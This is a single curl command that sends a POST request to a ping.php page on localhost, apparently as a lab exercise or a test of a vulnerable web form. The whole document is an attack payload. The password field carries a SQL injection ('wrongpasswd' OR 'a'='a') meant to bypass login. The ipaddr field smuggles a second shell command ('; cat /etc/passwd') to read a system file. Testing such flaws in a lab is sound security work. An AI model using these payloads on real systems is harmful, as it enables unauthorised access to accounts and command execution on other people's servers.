curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; cat /etc/passwd" -X POST http://localhost:8000/ping.php
